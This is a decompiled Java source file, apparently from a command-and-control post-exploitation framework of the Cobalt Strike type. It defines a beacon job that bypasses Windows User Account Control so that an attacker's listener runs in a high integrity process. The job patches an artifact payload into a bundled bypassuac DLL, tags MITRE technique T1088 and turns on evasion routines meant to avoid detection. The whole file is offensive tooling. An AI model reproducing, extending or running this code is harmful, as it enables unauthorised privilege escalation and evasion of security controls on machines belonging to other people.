package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class BypassUACJob extends Job {
   protected String name;
   protected String listener;
   protected String artifact;

   public BypassUACJob(TaskBeacon var1, String var2, String var3, byte[] var4) {
      super(var1);
      this.name = var2;
      this.listener = var3;
      this.artifact = CommonUtils.bString(var4);
   }

   public String getDescription() {
      return "Tasked beacon to spawn " + this.listener + " in a high integrity process";
   }

   public String getShortDescription() {
      return "bypassuac";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/bypassuac.x64.dll" : "resources/bypassuac.dll";
   }

   public String getPipeName() {
      return "bypassuac";
   }

   public String getTactic() {
      return "T1088";
   }

   public int getCallbackType() {
      return 0;
   }

   public int getWaitTime() {
      return 30000;
   }

   public byte[] fix(byte[] var1) {
      String var2 = CommonUtils.pad(this.artifact, '\u0000', 24576);
      var1 = CommonUtils.patch(var1, "ARTIFACT ABCDEFGHIJKLMNOPQRSTUVWXYZ", var2);
      Packer var3 = new Packer();
      var3.little();
      var3.addInt(this.artifact.length());
      var3.addString((String)this.name, 28);
      String var4 = CommonUtils.pad(CommonUtils.bString(var3.getBytes()), '\u0000', 64);
      var1 = CommonUtils.patch(var1, "META ABCDEFGHIJKLMNOPQRSTUVWXYZ", var4);
      return var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
